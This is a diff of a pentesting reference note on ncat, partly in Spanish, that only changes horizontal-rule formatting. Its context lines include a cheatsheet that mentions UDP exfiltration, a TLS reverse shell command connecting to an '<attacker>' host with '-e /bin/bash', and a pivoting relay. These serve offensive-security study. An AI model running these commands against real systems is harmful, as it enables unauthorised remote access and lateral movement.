@@ -12,7 +12,7 @@ linked:
 > [!info]
 > Nmap's modern netcat. SSL/TLS nativo, proxy, IPv6, broker mode, allow/deny lists. Reemplazo directo de `nc` con features añadidas.
 
-***
+---
 
 ## Cheatsheet
 
@@ -27,7 +27,7 @@ linked:
 | `ncat --broker -lvnp 4444` | Broker mode | Chat multi-client / relay |
 | `ncat -u -lvnp 4444` | UDP listener | UDP exfil/recv |
 
-***
+---
 
 ## TLS reverse shell
 
@@ -40,7 +40,7 @@ ncat --ssl -lvnp 4444 --ssl-cert cert.pem --ssl-key key.pem
 ncat --ssl <attacker> 4444 -e /bin/bash
 ```
 
-***
+---
 
 ## Relay / pivoting
 
@@ -49,7 +49,7 @@ ncat --ssl <attacker> 4444 -e /bin/bash
 ncat -lvnp 8080 -c "ncat <target> 80"
 ```
 
-***
+---
 
 ## Notas Relacionadas
 
